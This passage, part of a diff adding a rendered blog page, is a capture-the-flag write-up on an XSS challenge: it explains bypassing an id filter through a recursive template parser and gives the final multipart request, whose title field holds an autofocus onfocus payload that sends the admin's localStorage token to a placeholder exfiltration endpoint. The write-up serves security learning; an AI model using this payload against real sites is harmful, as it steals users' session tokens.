+    <span style="color:#66d9ef">if</span> (<span style="color:#e6db74">&#34;0123456789 abcdefghijklmnopqrstuvwxyz ABCDEFGHIJKLMNOPQRSTUVWXYZ !@#$%^&amp;*()_-+={}|&#34;</span>.<span style="color:#a6e22e">includes</span>(<span style="color:#66d9ef">char</span>) <span style="color:#f92672">===</span> <span style="color:#66d9ef">false</span>)
+        <span style="color:#66d9ef">return</span>;
+</code></pre></div><p>Since the injection occurs in a Javascript string, we need to inject a <code>'</code> to escape the string and execute code but <code>'</code> is not allowed here.</p>
+<h3 id="3--bypassing-ids-filter">3- Bypassing id&rsquo;s filter</h3>
+<p>After reading the [https://github.com/NadavTasher/Template/](templating framework) code, I realized that the template parser is recursive : it takes all the fields of the object passed as parameters, search the template for the string <code>${FIELD_NAME}</code> and replace it by its value. So, if a field <code>foo</code> has a value like <code>${bar}</code>, the template will first replace <code>${foo}</code> by <code>${bar}</code> and then replace <code>${bar}</code> by <code>bar</code>'s value.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-javascript" data-lang="javascript"><span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span><span style="color:#a6e22e">value</span>.<span style="color:#a6e22e">includes</span>(<span style="color:#a6e22e">search</span>))
+    <span style="color:#66d9ef">while</span> (<span style="color:#a6e22e">html</span>.<span style="color:#a6e22e">includes</span>(<span style="color:#a6e22e">search</span>))
+        <span style="color:#a6e22e">html</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">html</span>.<span style="color:#a6e22e">replace</span>(<span style="color:#a6e22e">search</span>, <span style="color:#a6e22e">value</span>);
+</code></pre></div><p>We can use this behavior to escape the filter on <code>id</code> : we just need to set <code>id</code> to the value <code>${title}</code> and perform our XSS injection through the <code>title</code> field.</p>
+<h3 id="4--putting-it-all-together">4- Putting it all together</h3>
+<p>The final payload is contained in the following request (don not forget to mention the admin !) :</p>
+<pre><code>------WebKitFormBoundaryBMbsD8z0stKDVPNg
+Content-Disposition: form-data; name=&quot;token&quot;
+
+YOUR_SECRET_TOKEN_FROM_LOCAL_STORAGE
+------WebKitFormBoundaryBMbsD8z0stKDVPNg
+Content-Disposition: form-data; name=&quot;id&quot;
+
+${title}
+------WebKitFormBoundaryBMbsD8z0stKDVPNg
+Content-Disposition: form-data; name=&quot;contents&quot;
+
+@shuky Hi mate
+------WebKitFormBoundaryBMbsD8z0stKDVPNg
+Content-Disposition: form-data; name=&quot;title&quot;
+
+&quot; onfocus=&quot;a=(function(){request=new XMLHttpRequest();request.open('GET','https://EXFILTRATION_ENDPOINT/?c='+localStorage.getItem('token'),false);request.send(null);})()&quot; autofocus contenteditable bla=&quot;
+------WebKitFormBoundaryBMbsD8z0stKDVPNg--
+</code></pre><p>Since the admin bot was using Chrome headless, it was required to craft an XSS payload which is automatically triggered in Chrome. This payload doesn&rsquo;t work without user-interaction in Firefox.
+The flag was base64 encoded in the admin&rsquo;s token, which you can exfiltrate with an HTTP request.</p>
+<p>Flag : KAF{_w3ll_th4t5_wh4t_b4d_c0d3_l00k5_l1ke}</p>
+<h2 id="-bye"><em>[+]</em> Bye</h2>
+<p><strong>Feel free to tell me what you think about this post :)</strong></p>
+
+            </div>
+            
+            
+            <div class="push"></div>
+        </div>
+        <footer class="footer text-center">
+<p>2020 - 0xUKN -
+<span class="credit">
+	Powered by
+	<a target="_blank" href="https://gohugo.io">Hugo</a>
+	and based on
+	<a target="_blank" href="https://github.com/LordMathis/hugo-theme-nix/">Nix</a> theme.
+</span>
+</p>
+</footer>
+
+    </body>
